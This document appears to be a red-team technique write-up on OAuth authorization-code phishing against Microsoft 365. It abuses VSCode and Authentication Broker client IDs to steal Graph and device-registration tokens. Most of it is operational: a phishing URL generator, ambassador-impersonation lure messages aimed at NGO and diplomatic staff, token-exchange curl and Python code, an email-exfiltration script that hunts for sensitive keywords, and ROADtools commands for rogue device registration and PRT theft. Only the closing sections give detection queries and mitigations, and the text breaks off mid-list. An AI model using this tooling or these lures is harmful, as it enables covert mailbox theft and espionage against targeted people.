# [IA-PHISH-006]: Exchange EWS Impersonation Phishing via OAuth

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-006 |
| **MITRE ATT&CK v18.1** | [T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | M365 (Outlook, Teams), Azure AD |
| **Severity** | Critical |
| **CVE** | N/A (OAuth design limitation; no vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-04-22 |
| **Affected Versions** | All M365 tenants with first-party OAuth apps enabled (VSCode, Teams, Auth Broker) |
| **Patched In** | N/A (design limitation; mitigations via admin consent, conditional access, DMARC signing) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** EWS impersonation phishing exploits Microsoft's legitimate OAuth 2.0 authentication workflows to trick users into granting attackers access tokens that can be used to impersonate the victim and access Exchange Web Services (EWS) data—specifically emails and calendar information—via Microsoft Graph API. Unlike traditional phishing that steals credentials, OAuth phishing manipulates the authentication process itself. Attackers craft specially-designed OAuth authorization URLs that impersonate legitimate Microsoft first-party applications (Visual Studio Code with client_id `aebc6443-996d-45c2-90f0-388ff96faa56`, Microsoft Authentication Broker with client_id `29d9ed98-a469-4536-ade2-f981bc1d605e`), then trick victims into clicking these URLs, authenticating with their M365 credentials, and sharing back the authorization code. Attackers then exchange this code for access tokens that provide persistent, undetectable access to the victim's mailbox and calendar.

**Attack Pattern:** (1) Attacker identifies high-value target via OSINT (NGO staff, diplomatic personnel, human rights workers, government officials), (2) Attacker establishes rapport via Signal/WhatsApp posing as European government official or person of influence, (3) Attacker sends OAuth phishing URL disguised as legitimate meeting join link, (4) Victim clicks link, sees legitimate Microsoft login page, (5) Victim authenticates and is redirected to VSCode or other application, (6) VSCode displays authorization code to user, (7) Attacker tricks victim into sharing authorization code via WhatsApp/Signal, (8) Attacker exchanges code for access token using ROADtools or custom script, (9) Attacker uses access token to impersonate victim, download emails, calendar, and other EWS data via Microsoft Graph API, (10) Attacker performs intelligence gathering or lateral movement attacks using data obtained.

**Business Impact:** **Covert intelligence gathering at scale.** Recent campaigns demonstrate this attack's effectiveness against high-value targets. Volexity documented attacks against NGOs, human rights organizations, and government agencies working on Ukraine-related issues. Proofpoint identified 900+ organizations and nearly 3,000 users targeted in Q1 2025 with a confirmed success rate exceeding 50%. Unlike traditional phishing, EWS impersonation phishing provides attackers with **persistent, undetectable access**—sign-in logs show Microsoft IP addresses (not attacker IPs), making forensic attribution difficult. Microsoft Graph API access appears as normal Outlook activity. Attackers can steal months of email history, calendar invitations revealing organizational relationships, contact lists, and sensitive business information—all without triggering traditional security alerts.

**Key Differentiator from Other Phishing:** Traditional phishing compromises the user's password; if detected and password is reset, access is lost. OAuth phishing compromises a token with a specific scope (e.g., Mail.Read) that is valid for hours or days. Even if password is reset, the attacker's access token remains valid. The token is tied to the victim's account but appears to originate from Microsoft infrastructure (not the attacker's IP), making it extremely difficult to detect.

### Operational Risk

- **Execution Risk:** **Very Low** — Attacker only needs ability to send phishing URL and engage victim in social engineering conversation.
- **Stealth:** **Extremely High** — All activity occurs on legitimate Microsoft infrastructure. Sign-in logs show Microsoft IPs, not attacker IPs. Graph API access appears as normal Outlook activity. No suspicious indicators in email headers or logs.
- **Persistence:** **Very High** — Access token valid for hours/days. Does not require password maintenance. Even if password is reset, token remains valid. Attacker can request refresh token for longer persistence (up to 90 days offline token validity).
- **Detectability:** **Very Low** — No obvious indicators. Requires correlation of unusual client IDs with Graph API access patterns and understanding of OAuth token flows.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2, 6.1 | Inadequate user awareness; failed detection of suspicious OAuth usage; lack of admin consent policies. |
| **DISA STIG** | AC-2, AC-3, AU-12 | Inadequate access control and authentication; OAuth token abuse. |
| **CISA SCuBA** | IdM-1, IdM-2 | Weak identity governance; inadequate anomalous sign-in and app usage detection. |
| **NIST 800-53** | AC-2, AC-3, AC-6, SI-4 | Access control, least privilege, system monitoring for suspicious authentication. |
| **GDPR** | Art. 32, 33 | Insufficient security measures; data breach notification. |
| **DORA** | Art. 9, 18 | ICT risk management; incident reporting. |
| **NIS2** | Art. 21, 23 | Cyber security measures; incident reporting. |
| **ISO 27001** | A.8.2.3, A.9.2.1 | User access management and authentication control. |
| **ISO 27005** | Risk Scenario: "OAuth Token Compromise via Phishing" | Unauthorized access to EWS/Graph API via stolen OAuth tokens. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**

- **Attacker Side:** None. OAuth URLs are unauthenticated and publicly accessible. Attacker only needs internet access and ability to send messages via Signal/WhatsApp.
- **Victim Side:** Any valid M365 user with mailbox access.

**Required Access:**

- Attacker must be able to craft OAuth authorization URLs
- Attacker must be able to send phishing URLs to victims (via email, Signal, WhatsApp, or other messaging platforms)
- Attacker must be able to receive authorization codes from victims
- Attacker must be able to execute code to exchange authorization code for access tokens (Python script, cURL, ROADtools, etc.)

**Supported Versions:**

- **M365:** All versions with Exchange Online and Azure AD
- **OAuth Flows:** Authorization Code Grant, Device Code Flow, Refresh Token Grant
- **Browsers:** All browsers (agnostic)

**Tools & Environment:**

- **Python** or **Bash** for OAuth token exchange
- **ROADtools** (open-source) for advanced token manipulation (device registration, PRT generation)
- **cURL** or **Postman** for HTTP requests to OAuth endpoints
- **Messaging Platforms:** Signal, WhatsApp, Telegram for phishing delivery and social engineering
- **Microsoft Graph SDK** (Python, .NET, etc.) for EWS data exfiltration via Graph API

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Identifying High-Value Targets

**Objective:** Attacker identifies victims with access to sensitive information or strategic importance.

**OSINT Sources:**

- **LinkedIn:** Search for users at target organizations (NGOs, human rights groups, government agencies, defense contractors)
- **Organization websites:** Staff directories listing employee names and emails
- **Twitter/X, Medium, GitHub:** Public contributions revealing professional role and email domain
- **Leaked credentials databases:** Previous breach data
- **Email verification services:** Tools like hunter.io, rocketreach.co to confirm email formats
- **News coverage:** Recent articles about organization activities can help with social engineering themes

**Target Selection Criteria (from Volexity's Observation):**

- Diplomatic/government personnel
- Human rights defenders
- NGO staff with Ukraine expertise
- Think tank researchers
- Defense industry employees
- Government officials

### Crafting Phishing URLs

**Objective:** Attacker understands OAuth parameter structure to craft convincing phishing URLs.

**OAuth 2.0 Authorization URL Components:**

```
https://login.microsoftonline.com/[endpoint]/oauth2/v2.0/authorize?
  client_id=[VSCode: aebc6443-996d-45c2-90f0-388ff96faa56]
  &scope=[https://graph.microsoft.com/.default]
  &response_type=code
  &redirect_uri=[insiders.vscode.dev/redirect]
  &login_hint=[target@victim.onmicrosoft.com]
  &state=[arbitrary_value_for_csrf_protection]
  &prompt=select_account
```

**URL Parameter Significance:**

- **client_id:** Identifies the application. `aebc6443-996d-45c2-90f0-388ff96faa56` is VSCode (legitimate Microsoft app)
- **scope:** `https://graph.microsoft.com/.default` requests all permissions pre-consented to the VSCode application
- **response_type=code:** Indicates authorization code grant flow
- **redirect_uri:** Where OAuth response is sent. `insiders.vscode.dev/redirect` is legitimate Microsoft domain but attackers may use lookalikes
- **login_hint:** Pre-fills victim email to eliminate friction
- **state:** Arbitrary value (attackers often set this to the original target URL like `mae.gov.ro/...` to make it appear legitimate)

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: VSCode OAuth Phishing with Graph API Access (UTA0352 Pattern)

**Supported Versions:** All M365 versions with VSCode first-party application registered

**Scenario:** Attacker sends phishing URL impersonating VSCode application to target, victim clicks and authenticates, attacker receives authorization code, exchanges code for Graph API access token, then downloads victim's emails.

#### Step 1: Craft OAuth Phishing URL

**Objective:** Create convincing OAuth URL that appears to be legitimate VSCode authentication.

**Phishing URL Example:**

```
https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?
state=https://mae.gov.ro/secure_meeting_info&
client_id=aebc6443-996d-45c2-90f0-388ff96faa56&
scope=https://graph.microsoft.com/.default&
response_type=code&
redirect_uri=https://insiders.vscode.dev/redirect&
login_hint=alice@company.onmicrosoft.com&
prompt=select_account
```

**URL Obfuscation Techniques:**

- Attacker uses legitimate `state` parameter value (e.g., Romanian government URL) to make URL appear legitimate
- Attacker may encode URL in QR code to hide full URL from user inspection
- Attacker may use URL shorteners (bit.ly, tinyurl.com) to hide phishing URL structure
- Attacker may embed URL in PDF or document (as observed in Volexity attacks with fake Romanian Ministry PDFs)

**Python Script to Generate OAuth URL:**

```python
#!/usr/bin/env python3
"""
OAuth Phishing URL Generator
Purpose: Create convincing VSCode OAuth URLs for phishing
"""

from urllib.parse import urlencode
import json

def generate_vscode_oauth_url(target_email, state_url="https://mae.gov.ro/"):
    """
    Generate VSCode OAuth phishing URL
    """
    
    params = {
        "state": state_url,  # Legitimate-looking URL
        "client_id": "aebc6443-996d-45c2-90f0-388ff96faa56",  # VSCode client ID
        "scope": "https://graph.microsoft.com/.default",
        "response_type": "code",
        "redirect_uri": "https://insiders.vscode.dev/redirect",
        "login_hint": target_email,
        "prompt": "select_account"
    }
    
    base_url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize"
    
    oauth_url = f"{base_url}?{urlencode(params)}"
    
    return oauth_url

def generate_device_registration_url(target_email):
    """
    Generate Device Registration Service (DRS) OAuth URL
    """
    
    params = {
        "url": "https://teams.microsoft.com/l/meetup-join/19%3aMEETING",  # Fake Teams URL
        "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Auth Broker client ID
        "resource": "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9",  # Device Registration Service
        "response_type": "code",
        "redirect_uri": "https://login.microsoftonline.com/WebApp/CloudDomainJoin/8",
        "login_hint": target_email,
        "amr_values": "ngcmfa"
    }
    
    base_url = "https://login.microsoftonline.com/common/oauth2/authorize"
    
    oauth_url = f"{base_url}?{urlencode(params)}"
    
    return oauth_url

if __name__ == "__main__":
    target = "alice@company.onmicrosoft.com"
    
    print("[*] Generating VSCode OAuth Phishing URL")
    vscode_url = generate_vscode_oauth_url(target)
    print(f"VSCode URL:\n{vscode_url}\n")
    
    print("[*] Generating Device Registration OAuth Phishing URL")
    drs_url = generate_device_registration_url(target)
    print(f"DRS URL:\n{drs_url}\n")
```

#### Step 2: Establish Social Engineering Context

**Objective:** Build credibility and trust to convince victim to click link.

**Volexity-Observed Pattern (UTA0352 - Romanian Diplomacy Impersonation):**

**Day 1-3: Initial Contact via Signal/WhatsApp**

```
Attacker: "Hello, I am Ambassador [Name] from the Romanian Ministry of Foreign Affairs. 
We are organizing a private meeting to discuss Ukraine-related humanitarian issues. 
Would you be available for a meeting next week? We believe your organization's expertise 
would be valuable for our discussion."

Victim: "Yes, I'd be interested"

Attacker: "Excellent. Let me get back to you with the meeting details. I'll send 
an invitation with instructions on how to join."
```

**Day 4-7: Building False Context**

- Attacker sends PDF document "purporting" to be from Romanian Ministry with meeting details
- Document contains professional letterhead, official branding, meeting agenda
- Document instructs victim on "how to join via secure video conference"
- Document includes vague reference to "Extended Verification System (EVS)"

**Day 8: Sending Phishing URL**

```
Attacker: "As we discussed, here is the link to join our video conference. 
Please click the link below to verify your account access:

https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?...

You will need to sign in with your Microsoft account. Once you authenticate, 
you will be directed to join the meeting."
```

**Why This Works:**

- Victim has been engaged in multi-day conversation
- Victim has legitimate reason to expect meeting invite
- Victim trusts the attacker (believed to be government official)
- Victim sees legitimate Microsoft login page (not attacker-hosted phishing page)
- Victim is not prompted to enter password on phishing page—uses real Microsoft OAuth
- Victim assumes clicking link and signing in is normal procedure for meeting

#### Step 3: Victim Clicks Link and Authenticates

**Objective:** Victim authenticates with M365 credentials, Microsoft returns authorization code.

**Victim Experience:**

```
1. Victim clicks link in Signal message
   ↓
2. Browser redirects to https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?...
   ↓
3. Victim sees legitimate Microsoft login page:
   
   ┌─────────────────────────────┐
   │  Sign in                    │
   │                             │
   │  Email: alice@company.com   │
   │  [Next button]              │
   └─────────────────────────────┘
   
4. Victim enters credentials (if not already logged in to M365)
   ↓
5. Victim may be prompted for MFA (TOTP, Microsoft Authenticator)
   ↓
6. Microsoft validates credentials and MFA
   ↓
7. Victim is redirected to redirect_uri: https://insiders.vscode.dev/redirect
   ↓
8. VSCode page displays authorization code:
   
   ┌──────────────────────────────┐
   │  Device authorization        │
   │                              │
   │  Enter code: 1.AXQAAA...    │
   │                              │
   │  [Continue button]           │
   └──────────────────────────────┘
   
9. Attacker instructs victim to send back the code displayed on page
```

**Key Detail:** The authorization code is also visible in the address bar:

```
https://insiders.vscode.dev/redirect#code=1.AXQAABZl4G...&session_state=...
```

**Microsoft Considerations:**

- Victim is not tricked into entering credentials on attacker-hosted page
- Victim uses legitimate Microsoft infrastructure for authentication
- MFA still works (victim must approve MFA challenge)
- However, victim is unaware they are granting OAuth permission to an attacker application
- Victim does not see an explicit "consent" screen (VSCode already has user consent)

#### Step 4: Attacker Receives Authorization Code

**Objective:** Victim shares authorization code with attacker via WhatsApp/Signal.

**Victim Action:**

```
Victim copies code from VSCode page: 1.AXQAABZl4G...

Victim: "I've authenticated. Here is the code: 1.AXQAABZl4G..."
Or: "I'll send you the URL from my browser:
    https://insiders.vscode.dev/redirect#code=1.AXQAABZl4G...&session_state=..."

Attacker: "Thank you, I will process your access now."
```

**Why Victim Shares Code:**

- Attacker has instructed victim to do so (framing as "normal procedure")
- Victim trusts attacker (believed to be legitimate government official)
- Victim does not understand that sharing this code grants full access to mailbox
- Victim sees code displayed on legitimate Microsoft VSCode page (appears safe)

#### Step 5: Attacker Exchanges Code for Access Token

**Objective:** Attacker exchanges authorization code for access token valid for Graph API access.

**Token Exchange Request (ROADtools or custom Python script):**

```bash
# Exchange authorization code for access token
curl -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=aebc6443-996d-45c2-90f0-388ff96faa56" \
  -d "client_secret=" \
  -d "code=1.AXQAABZl4G..." \
  -d "redirect_uri=https://insiders.vscode.dev/redirect" \
  -d "grant_type=authorization_code" \
  -d "scope=https://graph.microsoft.com/.default"
```

**Token Exchange Response:**

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1...",
  "expires_in": 3599,
  "ext_expires_in": 3599,
  "token_type": "Bearer",
  "scope": "https://graph.microsoft.com/.default",
  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1..."
}
```

**Python Script for Token Exchange:**

```python
#!/usr/bin/env python3
"""
OAuth Token Exchange
Purpose: Exchange authorization code for access token
"""

import requests
import json

def exchange_code_for_token(auth_code, client_id, redirect_uri):
    """
    Exchange OAuth authorization code for access token
    """
    
    token_url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
    
    payload = {
        "client_id": client_id,
        "client_secret": "",  # VSCode doesn't require secret
        "code": auth_code,
        "redirect_uri": redirect_uri,
        "grant_type": "authorization_code",
        "scope": "https://graph.microsoft.com/.default"
    }
    
    try:
        response = requests.post(token_url, data=payload)
        response.raise_for_status()
        
        token_data = response.json()
        
        print("[+] Token exchange successful!")
        print(f"    Access Token: {token_data['access_token'][:50]}...")
        print(f"    Expires in: {token_data['expires_in']} seconds")
        
        return token_data
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Token exchange failed: {e}")
        return None

if __name__ == "__main__":
    auth_code = input("[*] Enter authorization code: ")
    client_id = "aebc6443-996d-45c2-90f0-388ff96faa56"  # VSCode
    redirect_uri = "https://insiders.vscode.dev/redirect"
    
    tokens = exchange_code_for_token(auth_code, client_id, redirect_uri)
    
    if tokens:
        print("\n[+] Tokens successfully obtained:")
        print(json.dumps(tokens, indent=2))
```

#### Step 6: Access Victim's Emails via Microsoft Graph API

**Objective:** Use access token to download emails and calendar data from victim's mailbox.

**Python Script to Exfiltrate Emails:**

```python
#!/usr/bin/env python3
"""
Microsoft Graph API - Email Exfiltration
Purpose: Download victim's emails using access token
"""

import requests
import json
from datetime import datetime, timedelta

def get_emails(access_token, max_results=100):
    """
    Retrieve emails from victim's mailbox using Graph API
    """
    
    graph_url = "https://graph.microsoft.com/v1.0/me/messages"
    
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    
    # Query parameters to retrieve useful email data
    params = {
        "$top": max_results,
        "$select": "id,from,subject,receivedDateTime,bodyPreview,hasAttachments",
        "$orderby": "receivedDateTime desc"
    }
    
    try:
        response = requests.get(graph_url, headers=headers, params=params)
        response.raise_for_status()
        
        emails = response.json()
        
        print(f"[+] Retrieved {len(emails.get('value', []))} emails")
        
        return emails.get('value', [])
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error retrieving emails: {e}")
        return []

def download_full_email(access_token, email_id):
    """
    Download full email content (including body)
    """
    
    graph_url = f"https://graph.microsoft.com/v1.0/me/messages/{email_id}"
    
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(graph_url, headers=headers)
        response.raise_for_status()
        
        return response.json()
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error retrieving email: {e}")
        return None

def get_attachments(access_token, email_id):
    """
    Retrieve attachments from email
    """
    
    graph_url = f"https://graph.microsoft.com/v1.0/me/messages/{email_id}/attachments"
    
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(graph_url, headers=headers)
        response.raise_for_status()
        
        attachments = response.json()
        
        return attachments.get('value', [])
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error retrieving attachments: {e}")
        return []

def exfiltrate_sensitive_emails(access_token):
    """
    Search for and download sensitive emails
    """
    
    graph_url = "https://graph.microsoft.com/v1.0/me/messages"
    
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    
    # Search for emails with sensitive keywords
    sensitive_keywords = ["password", "secret", "confidential", "classified", "urgent", "transfer", "wire"]
    
    for keyword in sensitive_keywords:
        params = {
            "$filter": f"contains(subject, '{keyword}') or contains(bodyPreview, '{keyword}')",
            "$select": "id,from,subject,receivedDateTime,bodyPreview",
            "$top": 50
        }
        
        try:
            response = requests.get(graph_url, headers=headers, params=params)
            response.raise_for_status()
            
            emails = response.json().get('value', [])
            
            if emails:
                print(f"\n[+] Found {len(emails)} emails containing '{keyword}':")
                for email in emails:
                    print(f"    Subject: {email['subject']}")
                    print(f"    From: {email['from']['emailAddress']['address']}")
                    print(f"    Received: {email['receivedDateTime']}")
                    print(f"    Preview: {email['bodyPreview'][:100]}...")
                    
                    # Download full email
                    full_email = download_full_email(access_token, email['id'])
                    if full_email:
                        # Save to file
                        with open(f"email_{keyword}_{email['id']}.json", "w") as f:
                            json.dump(full_email, f, indent=2)
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Error searching for '{keyword}': {e}")

if __name__ == "__main__":
    access_token = input("[*] Enter access token: ")
    
    print("[*] Retrieving emails...")
    emails = get_emails(access_token)
    
    print("\n[*] Downloaded emails:")
    for email in emails:
        print(f"  From: {email['from']['emailAddress']['address']}")
        print(f"  Subject: {email['subject']}")
        print(f"  Date: {email['receivedDateTime']}")
        if email['hasAttachments']:
            print(f"  [+] Has attachments")
        print()
    
    print("\n[*] Searching for sensitive emails...")
    exfiltrate_sensitive_emails(access_token)
```

**Graph API Endpoints Accessible with VSCode .default Scope:**

| Endpoint | Access | Purpose |
|---|---|---|
| `/me/messages` | **✓ Read** | List emails |
| `/me/messages/{id}` | **✓ Read** | Get full email body |
| `/me/mailFolders` | **✓ Read** | List folders (Inbox, Sent, etc.) |
| `/me/mailFolders/{id}/messages` | **✓ Read** | Get messages from specific folder |
| `/me/calendar` | **✓ Read** | List calendars |
| `/me/events` | **✓ Read** | List calendar events (reveals meetings, attendees) |
| `/me/contacts` | **✓ Read** | List all contacts |
| `/me/drive/root` | **✗ Denied** | OneDrive access blocked (VSCode lacks permission) |
| `/me/joinedTeams` | **✓ Read** | List Teams the user is member of |
| `/teams/{id}/channels` | **✓ Read** | List channels in Teams |

---

### METHOD 2: Device Registration + PRT Elevation (UTA0355 Pattern)

**Supported Versions:** All M365 versions with Device Registration Service enabled

**Scenario:** Attacker targets Device Registration Service (DRS) instead of Graph API, registers attacker-controlled device in victim's Entra ID, obtains Primary Refresh Token (PRT), then uses PRT to access all M365 services without further MFA.

**Key Advantage Over Method 1:** Method 1 provides short-term access (token expires in ~1 hour). Method 2 provides long-term persistence via PRT (valid for 90 days offline).

#### Step 1: Generate Device Registration OAuth URL

**Objective:** Create OAuth URL targeting Device Registration Service instead of Graph API.

**DRS OAuth URL:**

```
https://login.microsoftonline.com/common/oauth2/authorize?
url=https://teams.microsoft.com/l/meetup-join/19%3aMEETING&
client_id=29d9ed98-a469-4536-ade2-f981bc1d605e&
resource=01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9&
response_type=code&
redirect_uri=https://login.microsoftonline.com/WebApp/CloudDomainJoin/8&
amr_values=ngcmfa&
login_hint=alice@company.onmicrosoft.com
```

**Key Differences from VSCode URL:**

| Parameter | VSCode Method | Device Registration Method |
|---|---|---|
| **client_id** | `aebc6443-996d-45c2-90f0-388ff96faa56` (VSCode) | `29d9ed98-a469-4536-ade2-f981bc1d605e` (Auth Broker) |
| **resource** | Not specified (Graph implied) | `01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9` (DRS service) |
| **redirect_uri** | `insiders.vscode.dev/redirect` | `login.microsoftonline.com/WebApp/CloudDomainJoin/8` (cloud domain join) |
| **scope** | `https://graph.microsoft.com/.default` | Not specified (DRS implicit) |

#### Step 2-4: Same as Method 1

(Victim clicks, authenticates, shares code with attacker)

#### Step 5: Exchange Code for DRS Access Token

**Objective:** Get tokens scoped for Device Registration Service.

```python
def exchange_code_for_drs_token(auth_code):
    """
    Exchange OAuth code for Device Registration Service token
    """
    
    token_url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
    
    payload = {
        "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Auth Broker
        "client_secret": "",  # No secret required
        "code": auth_code,
        "redirect_uri": "https://login.microsoftonline.com/WebApp/CloudDomainJoin/8",
        "grant_type": "authorization_code",
        "resource": "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9"  # DRS
    }
    
    response = requests.post(token_url, data=payload)
    
    return response.json()
```

**Response Token:**

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1...",
  "refresh_token": "0.AYAABZl4...",
  "scope": "adrs_access",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

#### Step 6: Register Device Using ROADtools

**Objective:** Use DRS token to register malicious device in victim's Entra ID.

**ROADtools Device Registration:**

```bash
# Install ROADtools
pip install roadtools

# Create .roadtool_auth file with tokens
# Format:
# {
#   "access_token": "...",
#   "refresh_token": "...",
#   "_clientId": "29d9ed98-a469-4536-ade2-f981bc1d605e",
#   "expires_in": 3600
# }

# Register device
roadtx device register -n "DESKTOP-ATTACKER" --operatingsystem "Windows" --osversion "10.0.19041.928"

# Output:
# Device registered successfully
# Device ID: 12345678-1234-1234-1234-123456789012
# Device Certificate: -----BEGIN CERTIFICATE-----
```

**What This Accomplishes:**

- Attacker's virtual device now appears as legitimate hybrid-joined device in victim's Entra ID
- Attacker obtains device certificate and private key
- Device is trusted by Entra ID

#### Step 7: Obtain Primary Refresh Token (PRT)

**Objective:** Exchange DRS token and device cert for PRT.

```bash
# Using ROADtools to obtain PRT
roadtx prt request \
  --device-id 12345678-1234-1234-1234-123456789012 \
  --cert-path device-cert.pem \
  --key-path device-key.pem

# Output:
# PRT obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1...
```

**Why PRT is Valuable:**

- PRT is a "token-granting token"
- With PRT, attacker can request access tokens for ANY M365 service (Teams, SharePoint, OneDrive, etc.)
- PRT bypasses MFA requirements (device is marked as trusted)
- PRT is valid for 90 days (vs. access token at 1 hour)
- PRT enables seamless SSO without user interaction

#### Step 8: Use PRT to Access Victim's Mailbox

**Objective:** Leverage PRT to silently obtain access token for Teams/Graph and download emails.

```bash
# Using PRT to authenticate as Teams (or other first-party app)
roadtx prt authenticate \
  --prt eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1... \
  --client-id 1b730954-1685-4b74-9bda-3364f7129bd8 \
  --resource https://graph.microsoft.com

# Output:
# Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1...
```

**With this access token, attacker can access:**

- All emails and calendar data
- OneDrive files
- SharePoint documents
- Teams messages and channels
- All user contacts and groups

#### Step 9: Victim Approves MFA (Attackers Request This)

**Objective:** Bypass conditional access policies requiring MFA for specific actions.

**Attacker's Social Engineering Message:**

```
Attacker: "To complete your access, please approve a multi-factor authentication 
request from your Microsoft Authenticator app. This is normal for secure access."

[Victim receives MFA prompt on their phone]
[Victim approves it]

Attacker: "Thank you. Your access is now complete."
```

**Why This Works:**

- Victim has been told to expect MFA prompt
- Victim assumes this is normal security procedure
- Victim approves without questioning
- Once approved, attacker's registered device is now fully trusted
- Future access bypasses MFA entirely (device is compliant)

---

## 5. TOOLS & COMMANDS REFERENCE

### [Microsoft Entra ID OAuth 2.0 Authorization Code Flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow)

**Endpoint:** `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize`  
**Token Endpoint:** `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token`

### [ROADtools - Open Source Tool for Azure/Entra ID Research](https://github.com/dirkjanm/ROADtools)

**Installation:**

```bash
pip install roadtools
```

**Key Commands:**

- `roadtx device register` – Register device in Entra ID
- `roadtx prt request` – Obtain PRT from device cert
- `roadtx prt authenticate` – Use PRT to get access token
- `roadtx refreshtoken request` – Exchange RT for new AT

### [Microsoft Graph API - Batch Requests](https://learn.microsoft.com/en-us/graph/api/batch-request)

**Allows downloading multiple emails in single request (faster exfiltration)**

### [cURL - HTTP Client](https://curl.se/)

**Token Exchange:**

```bash
curl -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
  -d "client_id=aebc6443-996d-45c2-90f0-388ff96faa56" \
  -d "code=..." \
  -d "grant_type=authorization_code"
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: OAuth Phishing via VSCode Client

**KQL Query:**

```kusto
SignInLogs
| where AppId == "aebc6443-996d-45c2-90f0-388ff96faa56"  // VSCode client ID
| where ResourceDisplayName == "Microsoft Graph"
| where AuthenticationProcessingDetails contains "OAuth"
| where ConditionalAccessStatus != "notApplied"  // User authenticated
| project
    TimeGenerated,
    UserPrincipalName,
    AppDisplayName,
    IPAddress,
    UserAgent,
    Status
```

### Query 2: Session Reuse Across Multiple IPs (Token Abuse Pattern)

**KQL Query:**

```kusto
SignInLogs
| where AppId == "aebc6443-996d-45c2-90f0-388ff96faa56"
| where TimeGenerated > ago(24h)
| summarize
    IPCount = dcount(IPAddress),
    FirstSignIn = min(TimeGenerated),
    LastSignIn = max(TimeGenerated)
    by UserPrincipalName, CorrelationId
| where IPCount > 1
| project
    UserPrincipalName,
    IPCount,
    TimeRange = LastSignIn - FirstSignIn
```

### Query 3: Device Registration Following OAuth

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Add device"
| where InitiatedBy.user.userPrincipalName == "DeviceRegistrationService"
| where TargetResources[0].modifiedProperties has "10.0.19041"  // Suspicious Windows version
| project
    TimeGenerated,
    InitiatedBy,
    TargetResources,
    OperationName
```

---

## 7. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query 1: Detect OAuth Authorization Events

**PowerShell:**

```powershell
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -Operations "Consent to application" `
  -ResultSize 5000 | `
  Where-Object { $_.AuditData -like "*aebc6443-996d-45c2-90f0-388ff96faa56*" } | `
  Export-Csv -Path "C:\Audit\oauth_consents.csv"
```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Require Admin Consent for Oauth Applications**

Prevent users from granting consent to applications. Only admins can approve.

**Manual Steps (Entra ID):**

1. Navigate to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
2. Set **User consent for applications:** "Do not allow user consent"
3. Save

**PowerShell:**

```powershell
Update-MgBetaPolicyAuthorizationPolicy `
  -DefaultUserRolePermissions @{
    AllowedToCreateApps = $false
    PermissionGrantPoliciesAssigned = @("microsoft-user-default-low")
  }
```

---

**2. Block VSCode and Device Registration OAuth URLs**

Prevent users from accessing phishing OAuth URLs.

**Proxy/Firewall Rules:**

- Block `insiders.vscode.dev/redirect`
- Block `vscode-redirect.azurewebsites.net`
- Block `vscode.dev`

**Conditional Access Policy:**

1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **New policy**
2. **Cloud apps or actions:** Select "Select apps" → Search for "Visual Studio Code"
3. **Access controls:** **Block**
4. **Enable policy**

---

**3. Enable Conditional Access for OAuth Token Acquisition**

Require MFA and device compliance for OAuth token requests.

**Manual Steps:**

1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **New policy**
2. **Users:** All users
3. **Cloud apps:** All cloud apps
4. **Conditions:**
   - **User risk:** High
   - **Sign-in risk:** High
5. **Access controls:** Require MFA

---

### Priority 2: HIGH

**4. Enable Anomalous Token Activity Detection**

Microsoft Defender for Cloud Apps can detect abnormal token usage.

**Manual Steps:**

